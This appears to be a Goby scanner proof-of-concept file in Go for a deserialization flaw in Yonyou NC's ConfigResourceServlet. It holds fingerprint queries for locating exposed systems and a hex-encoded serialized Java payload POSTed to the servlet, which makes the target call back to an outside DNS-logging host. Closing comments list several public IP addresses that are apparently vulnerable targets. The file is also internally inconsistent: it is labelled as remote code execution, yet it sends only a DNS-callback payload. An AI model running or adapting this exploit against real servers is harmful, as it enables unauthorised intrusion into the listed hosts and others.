package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC ConfigResourceServlet Api RCE",
    "Description": "<p>Yonyou NC is a management software for group companies under China UFIDA Group.</p><p>Yonyou NC ConfigResourceServlet routing has a deserialization vulnerability, attackers can obtain sensitive information and execute arbitrary commands to control server permissions.</p>",
    "Product": "yonyou-UFIDA-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2022-02-15",
    "Author": "1291904552@qq.com",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "3",
    "Impact": "<p>Yonyou NC ConfigResourceServlet routing has a deserialization vulnerability, attackers can obtain sensitive information and execute arbitrary commands to control server permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "用友 NC ConfigResourceServlet 接口反序列化漏洞",
            "Product": "用友-UFIDA-NC",
            "Description": "<p>用友 NC 是中国用友集团旗下一款面向集团企业的管理软件。</p><p>用友 NC ConfigResourceServlet路由存在反序列化漏洞，攻击者可获取敏感信息和执行任意命令控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>用友 NC ConfigResourceServlet路由存在反序列化漏洞，攻击者可获取敏感信息和执行任意命令控制服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "信创"
            ]
        },
        "EN": {
            "Name": "Yonyou NC ConfigResourceServlet Api RCE",
            "Product": "yonyou-UFIDA-NC",
            "Description": "<p>Yonyou NC is a management software for group companies under China UFIDA Group.</p><p>Yonyou NC ConfigResourceServlet routing has a deserialization vulnerability, attackers can obtain sensitive information and execute arbitrary commands to control server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Yonyou NC ConfigResourceServlet routing has a deserialization vulnerability, attackers can obtain sensitive information and execute arbitrary commands to control server permissions.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "Information technology application innovation industry"
            ]
        }
    },
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "xxx.dnslog.cn"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [],
    "CNVD": [],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Is0day": false,
    "PostTime": "2023-07-21",
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			//Godserver
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			//foeye
			//checkStr := strings.ToLower(goutils.RandomHexString(16))
			//checkUrl := foeye.GetFoeyeCheckURL(checkStr)

			//URLDNS
			payload1, _ := hex.DecodeString("ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F726974797400124C6A6176612F6C616E672F537472696E673B4C000466696C6571007E00034C0004686F737471007E00034C000870726F746F636F6C71007E00034C000372656671007E00037870FFFFFFFFFFFFFFFF7400")

			payloadLen2Hex := strconv.FormatInt(int64(len(checkUrl)), 16)
			payloadLen2, _ := hex.DecodeString(payloadLen2Hex)

			payload3, _ := hex.DecodeString("74000071007E00057400046874747070787400")

			payloadLen4Hex := strconv.FormatInt(int64(len("http://"+checkUrl)), 16)
			payloadLen4, _ := hex.DecodeString(payloadLen4Hex)

			uri1 := "/service/~ic/nc.bs.framework.server.ConfigResourceServlet"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Data = string(payload1) + string(payloadLen2) + checkUrl + string(payload3) + string(payloadLen4) + "http://" + checkUrl + "x"

			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				return godclient.PullExists(checkStr, time.Second*10)
			}

			//return godclient.PullExists(checkStr, time.Second*10)
			//return foeye.PullExists(checkStr, time.Second*10)
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)

			//URLDNS
			payload1, _ := hex.DecodeString("ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F726974797400124C6A6176612F6C616E672F537472696E673B4C000466696C6571007E00034C0004686F737471007E00034C000870726F746F636F6C71007E00034C000372656671007E00037870FFFFFFFFFFFFFFFF7400")

			payloadLen2Hex := strconv.FormatInt(int64(len(cmd)), 16)
			payloadLen2, _ := hex.DecodeString(payloadLen2Hex)

			payload3, _ := hex.DecodeString("74000071007E00057400046874747070787400")

			payloadLen4Hex := strconv.FormatInt(int64(len("http://"+cmd)), 16)
			payloadLen4, _ := hex.DecodeString(payloadLen4Hex)

			uri1 := "/service/~ic/nc.bs.framework.server.ConfigResourceServlet"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Data = string(payload1) + string(payloadLen2) + cmd + string(payload3) + string(payloadLen4) + "http://" + cmd + "x"

			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				if resp1.StatusCode == 200 {
					expResult.Output = resp1.RawBody
					expResult.Success = true
				}
			}

			return expResult
		},
	))
}

//112.94.14.135:8085
//39.104.108.90:88
//42.48.85.140:8081
//119.39.132.79:5060
//60.11.237.14:6666
//114.88.177.57:8086
//50%
